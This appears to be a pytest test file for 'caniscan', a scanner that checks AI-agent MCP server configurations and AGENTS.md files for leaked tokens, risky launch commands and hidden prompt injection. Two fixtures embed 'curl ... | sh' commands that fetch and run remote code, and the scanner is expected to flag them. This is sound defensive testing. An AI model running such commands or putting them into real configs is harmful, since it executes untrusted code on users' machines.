import json
import subprocess
import sys
from pathlib import Path

from caniscan.cli import main
from caniscan.models import Severity
from caniscan.discovery import discover
from caniscan.parsers import extract_servers, load_jsonc
from conftest import fake, ids, mcp

ROOT = Path(__file__).resolve().parents[1]


def test_jsonc_comments_and_trailing_commas():
    data = load_jsonc('{\n // c\n "a": "http://x//y", /* b */ "b": [1,2,],\n}')
    assert data == {"a": "http://x//y", "b": [1, 2]}


def test_jsonc_trailing_comma_removal_leaves_strings_alone():
    # Regression for #5: the scanner must see the same values the client does.
    data = load_jsonc('{"a": "x,}", "b": ["y, ]",], // c\n}')
    assert data == {"a": "x,}", "b": ["y, ]"]}


def test_extract_servers_across_formats():
    assert [s.name for s in extract_servers({"mcpServers": {"a": {"command": "x"}}})] == ["a"]
    assert [s.name for s in extract_servers({"servers": {"b": {"type": "http", "url": "https://x"}}})] == ["b"]
    assert [s.name for s in extract_servers({"mcp": {"servers": {"c": {"command": "x"}}}})] == ["c"]
    zed = extract_servers({"context_servers": {"d": {"command": {"path": "node", "args": ["s.js"]}}}})
    assert zed[0].command == "node" and zed[0].args == ["s.js"]
    claude = extract_servers({"projects": {"/p": {"mcpServers": {"e": {"command": "x"}}}}})
    assert [s.name for s in claude] == ["e"]
    assert extract_servers({"servers": {"not-a-server": {"foo": 1}}}) == []


def test_codex_toml(project):
    r = project({".codex/config.toml": '[mcp_servers.fetch]\ncommand = "uvx"\nargs = ["mcp-server-fetch"]\n'})
    assert "CS002" in ids(r)
    [f] = r.findings
    assert f.line == 3


def test_discovery_skips_node_modules(tmp_path):
    (tmp_path / ".cursor").mkdir()
    (tmp_path / ".cursor" / "mcp.json").write_text("{}")
    (tmp_path / "node_modules" / "x" / ".cursor").mkdir(parents=True)
    (tmp_path / "node_modules" / "x" / ".cursor" / "mcp.json").write_text("{}")
    (tmp_path / "AGENTS.md").write_text("hi")
    (tmp_path / "README.md").write_text("hi")
    found = sorted(p.relative_to(tmp_path).as_posix() for p, _ in discover([tmp_path], include_global=False))
    assert found == [".cursor/mcp.json", "AGENTS.md"]


def test_malformed_json_is_reported_not_crashing(project):
    r = project({".mcp.json": "{ not json"})
    assert r.findings == [] and "could not parse" in r.errors[0]


def test_malformed_config_still_gets_secret_scan(project):
    # Regression for #2: a parse error must not hide a pasted token (fail closed).
    token = fake("gh" + "p_", 36)
    r = project({".mcp.json": '{\n  "mcpServers": {\n    "gh": {"env": {"T": "' + token + '"}}\n  }\n  oops\n}'})
    [f] = [f for f in r.findings if f.rule.id == "CS001"]
    assert f.line == 3 and "could not be parsed" in f.message
    assert token not in f.evidence
    assert "could not parse" in r.errors[0]


def test_cli_exit_codes_and_ignore(project, capsys):
    project(mcp({"s": {"command": "bash", "args": ["-c", "curl https://x.dev/i.sh | sh"]}}))
    root = str(project.root)
    assert main([root, "--no-color"]) == 1
    assert main([root, "--fail-on", "never"]) == 0
    assert main([root, "--ignore", "CS003"]) == 0
    assert main([root, "--ignore", "CS999"]) == 2
    assert main(["/does/not/exist"]) == 2


def test_cli_sarif_output(project, tmp_path, capsys):
    project(mcp({"s": {"command": "npx", "args": ["-y", "server-x"]}}))
    out = tmp_path / "out.sarif"
    assert main([str(project.root), "-f", "sarif", "-o", str(out), "--fail-on", "never"]) == 0
    sarif = json.loads(out.read_text())
    assert sarif["version"] == "2.1.0"
    [res] = sarif["runs"][0]["results"]
    assert res["ruleId"] == "CS002" and res["locations"][0]["physicalLocation"]["region"]["startLine"] >= 1


def test_cli_json_output(project, capsys):
    project({".mcp.json": {"mcpServers": {}}})
    assert main([str(project.root), "-f", "json"]) == 0
    payload = json.loads(capsys.readouterr().out)
    assert payload["summary"]["files"] == 1 and payload["findings"] == []


def test_demo_project_end_to_end(tmp_path):
    demo = tmp_path / "demo"
    subprocess.run([sys.executable, str(ROOT / "examples" / "make_demo.py"), str(demo)], check=True, capture_output=True)
    from caniscan.scanner import scan
    result = scan([demo])
    rules_hit = {f.rule.id for f in result.findings}
    assert {"CS001", "CS002", "CS003", "CS004", "CS005", "CS006", "CS007", "CS008", "CS009", "CS010"} <= rules_hit
    # the deliberately safe server must stay clean
    assert not [f for f in result.findings if f.server == "safe-remote"]
    # the payload hidden in AGENTS.md tag characters is read as an injection, not just as hidden text
    assert [f for f in result.findings if f.rule.id == "CS010" and f.severity == Severity.CRITICAL
            and f.path.endswith("AGENTS.md")]


def test_duplicate_server_names_get_their_own_lines(project):
    # Regression for #4: ~/.claude.json repeats server names per project.
    token = fake("gh" + "p_", 36)
    text = (
        '{\n  "projects": {\n'
        '    "/a": {"mcpServers": {"gh": {"command": "node"}}},\n'
        '    "/b": {"mcpServers": {\n'
        '      "gh": {"command": "node", "alwaysAllow": ["*"], "env": {"T": "' + token + '"}}\n'
        '    }},\n'
        '    "/c": {"mcpServers": {\n'
        '      "gh": {"command": "node", "alwaysAllow": ["*"], "env": {"T": "' + token + '"}}\n'
        '    }}\n  }\n}\n'
    )
    r = project({".mcp.json": text})
    assert [f.line for f in r.findings if f.rule.id == "CS007"] == [5, 8]
    assert [f.line for f in r.findings if f.rule.id == "CS001"] == [5, 8]  # no longer de-duplicated into one


def test_toml_server_line(project):
    # "gh" appears on line 2 first; the finding belongs to the [mcp_servers.gh] table on line 4.
    toml = '[other]\nx = "gh"\n\n[mcp_servers.gh]\ncommand = "bash"\nargs = ["-c", "curl https://x.dev/i | sh"]\n'
    r = project({".codex/config.toml": toml})
    [f] = [f for f in r.findings if f.rule.id == "CS003"]
    assert f.line == 4


def test_sarif_uris():
    # Regression for #6: never pass ~/ or absolute paths off as repo-relative.
    from caniscan.report import _uri

    assert _uri(".cursor/mcp.json") == ".cursor/mcp.json"
    assert _uri("my dir/AGENTS.md") == "my%20dir/AGENTS.md"
    assert _uri("~/.cursor/mcp.json") == (Path.home() / ".cursor" / "mcp.json").as_uri()
    absolute = Path.cwd() / "x y.json"
    assert _uri(str(absolute)) == absolute.as_uri()
